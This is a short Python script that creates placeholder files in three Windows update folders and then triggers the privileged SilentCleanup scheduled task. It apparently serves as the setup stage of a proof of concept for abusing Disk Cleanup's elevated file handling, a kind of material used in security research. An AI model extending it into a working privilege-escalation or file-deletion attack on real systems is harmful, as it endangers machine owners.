import os

# Create 3 folders and put text.txt with "AAAA" inside each
print("Creating folders and files...")
folders = [r"C:\$Windows.~WS", r"C:\ESD\Windows", r"C:\ESD\Download"]
for folder in folders:
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, "text.txt"), "w") as f:
        f.write("AAAA")

input("Press Enter to run the SilentCleanup scheduled task...")
os.system(r'schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I')